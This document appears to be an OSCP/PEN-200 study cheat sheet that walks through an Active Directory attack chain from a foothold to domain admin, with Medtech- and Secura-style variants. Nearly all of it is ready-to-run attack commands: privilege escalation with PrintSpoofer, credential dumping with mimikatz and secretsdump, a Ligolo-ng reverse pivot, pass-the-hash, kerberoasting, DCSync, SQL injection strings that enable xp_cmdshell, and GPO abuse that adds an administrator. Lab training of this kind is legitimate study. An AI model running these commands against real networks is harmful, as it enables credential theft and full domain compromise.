# AD Attack Chain: Real-World Walkthrough (Challenge Lab Pattern)

This documents the exact pattern from the PEN-200 challenge labs (Medtech, Secura, OSCP A/B) — which mirrors the exam's AD set exactly.

## Network Topology Pattern

```
┌─────────────────────────────────────────────────────┐
│                  YOUR KALI (Attack)                  │
│              tun0: 192.168.X.Y                       │
└──────────────────┬──────────────────────────────────┘
                   │ VPN
┌──────────────────▼──────────────────────────────────┐
│              PUBLIC NETWORK (192.168.X.0/24)          │
│                                                       │
│    MS01 (Entry Point) - dual-homed                    │
│    192.168.X.10 + 10.10.X.10                         │
│                                                       │
└──────────────────┬──────────────────────────────────┘
                   │ (PIVOT HERE)
┌──────────────────▼──────────────────────────────────┐
│              INTERNAL NETWORK (10.10.X.0/24)          │
│                                                       │
│    MS02 (Client 2)              DC01 (Domain Ctrl)    │
│    10.10.X.20                    10.10.X.30           │
│                                                       │
└─────────────────────────────────────────────────────┘
```

## Attack Chain (Exam AD Set)

### Stage 1: MS01 - Entry Point (Assumed Breach)
**Provided:** Low-privilege domain credentials (user:password)

```bash
# Connect via WinRM (most common scenario)
evil-winrm -i $MS01_IP -u $DOMAIN_USER -p $PASSWORD

# Enumerate the machine
whoami /priv
whoami /groups
netstat -ano
systeminfo

# Check for SeImpersonatePrivilege (most common path)
whoami /priv | findstr Impersonate
# If present → PrintSpoofer/GodPotato to SYSTEM
PrintSpoofer64.exe -i -c cmd.exe

# Alternative: Service misconfiguration
# Alternative: Kernel exploit
# Alternative: Credential re-use from other accounts

# AS SYSTEM, dump credentials
reg save hklm\sam sam.hive
reg save hklm\system system.hive
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# Dump domain cached creds
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
# → Find password/hash for a user that can reach MS02
```

### Stage 2: Pivot to Internal Network

```bash
# MS01 is usually dual-homed (2 NICs)
ipconfig  # Shows second subnet (10.10.X.0/24)
arp -a    # Shows MS02 and DC01

# Set up pivoting (Ligolo-ng is preferred in recent exams)

# On Kali (attack machine):
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.X.0/24 dev ligolo
./proxy -selfcert -laddr 0.0.0.0:443

# Upload agent to MS01 and run:
./agent -connect $KALI_IP:443 -ignore-cert

# In proxy console:
ligolo-ng » session
[Agent: MS01] » start

# Now you can reach MS02 and DC01 directly
crackmapexec smb 10.10.X.20 -u $DOMAIN_USER -p $PASSWORD
```

### Stage 3: MS02 - Client Machine #2

```bash
# From Kali (through pivot), enumerate MS02
nmap -sT -Pn -p 445,5985,3389,80,443 10.10.X.20
crackmapexec smb 10.10.X.20 -u $DOMAIN_USER -p $PASSWORD --shares

# Use credentials found from MS01
# Common paths:
# 1. Pass-the-hash with admin hash
evil-winrm -i 10.10.X.20 -u Administrator -H <NTHASH>

# 2. Use discovered cleartext password
crackmapexec winrm 10.10.X.20 -u user -p 'password'

# 3. Kerberos attacks (kerberoast, AS-REP) from MS01's context

# Once on MS02, escalate to admin
whoami /priv
# Look for SeImpersonate or misconfigured services

# Dump more creds and look for Domain Admin access
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
```

### Stage 4: DC01 - Domain Controller (Domain Admin)

```bash
# From MS02 (or MS01), enumerate AD for DA access paths

# BloodHound (run from Kali through pivot)
bloodhound-python -u $USER -p $PASSWORD -d $DOMAIN -ns 10.10.X.30 -c all

# Or run SharpHound on MS02 and exfiltrate
SharpHound.exe -c All

# Common paths to DA (check BloodHound):
# 1. DCSync (if user has Replication rights)
impacket-secretsdump $DOMAIN/admin:password@10.10.X.30

# 2. ADCS abuse (ESC1/ESC3/ESC8 - see ADCS section)
certipy find -u $DOMAIN_USER@$DOMAIN -p $PASSWORD -dc-ip 10.10.X.30

# 3. Kerberoast a privileged account
impacket-GetUserSPNs $DOMAIN/$USER:$PASSWORD@10.10.X.30 -request

# 4. RBCD / delegation abuse (if ms02$ machine account has GenericWrite)
# See RBCD section

# 5. ACL abuse from BloodHound paths
# GenericAll on user → ForceChangePassword
net user target_admin NewPass123! /domain

# ONCE DA: Dump all domain hashes
impacket-secretsdump $DOMAIN/Administrator:password@10.10.X.30

# Capture proof.txt
type \\10.10.X.30\C$\Users\Administrator\Desktop\proof.txt
```

---

## Medtech-Style Pattern (SQLi → MSSQL → Pivot → DA)

This is a common concrete chain:

```
1. External web server has SQL injection
2. SQLi is on MSSQL (xp_cmdshell available)
3. Get shell on web server as low-priv user
4. Escalate to SYSTEM (PrintSpoofer/GodPotato)
5. Dual-homed → pivot to internal network
6. Enumerate internal AD (BloodHound)
7. Find kerberoastable account / ADCS / RBCD
8. Compromise Domain Controller
```

```bash
# Example: SQLi to xp_cmdshell
# Found: login.php has SQL injection in username field
admin' OR 1=1-- -
admin' UNION SELECT 1,2,3-- -

# Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --

# Execute command
admin'; EXEC xp_cmdshell 'powershell -enc <BASE64>'; --
```

---

## Secura-Style Pattern (WebApp CVE → Pivot → GPO Abuse)

```
1. ManageEngine / custom web app → public CVE exploit
2. Initial foothold
3. Pivot to internal network (chisel)
4. Enumerate AD → find GPO delegation
5. SharpGPOAbuse to create malicious GPO
6. Push GPO to domain-joined machines → DA
```

```bash
# GPO Abuse (SharpGPOAbuse)
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" \
  --Author $DOMAIN\Administrator --Command "cmd.exe" \
  --Arguments "/c net localgroup Administrators $USER /add" \
  --GPOName "Default Domain Policy"

# Force GPO update
gpupdate /force
```
